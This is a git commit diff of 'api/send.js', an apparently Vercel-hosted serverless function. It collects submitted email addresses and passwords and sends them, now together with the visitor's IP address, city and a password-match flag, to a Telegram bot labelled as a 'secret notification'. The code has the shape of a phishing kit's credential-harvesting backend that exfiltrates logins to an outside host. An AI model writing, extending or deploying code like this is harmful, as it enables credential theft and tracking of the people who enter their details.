2d73255ecfc4908ef92be2cc751e193a2efc2712
mamiqmn-prog <mamiqmn@gmail.com>
2026-03-25 03:15:15 +0300

    Update send.js

--- api/send.js
+++ api/send.js
@@ -1,18 +1,19 @@
 export default async function handler(req, res) {
-    if (req.method === 'POST') {
-        const { email, pass } = req.body;
-        // BURAYI ELLEME! Vercel burayı otomatik dolduracak.
-        const BOT_TOKEN = process.env.TELEGRAM_TOKEN;
-        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+    if (req.method !== 'POST') return res.status(405).end();
+    const { email, pass, ipData } = req.body;
+    
+    // Vercel'deki gizli değişkenleri kullanıyoruz
+    const BOT_TOKEN = process.env.BOT_TOKEN;
+    const CHAT_ID = process.env.TELEGRAM_ID;
+    const DOGRU_SIFRE = process.env.SIFRE;
 
-        const text = `🚀 **GİZLİ SİSTEM BİLDİRİMİ**\n📧: ${email}\n🔑: ${pass}`;
-        
-        try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
-            return res.status(200).json({ success: true });
-        } catch (e) {
-            return res.status(500).json({ error: "Hata" });
-        }
+    const mesaj = `🚀 **TERCES BİLDİRİM**\n📧: ${email}\n🔑: ${pass}\n📡 IP: ${ipData.ip}\n📍: ${ipData.city}\n✅: ${pass === DOGRU_SIFRE ? "BAŞARILI" : "HATALI"}`;
+
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(mesaj)}&parse_mode=Markdown`);
+        return res.status(200).json({ success: true });
+    } catch (e) {
+        return res.status(500).json({ error: "Hata" });
     }
-    return res.status(405).end();
 }
+
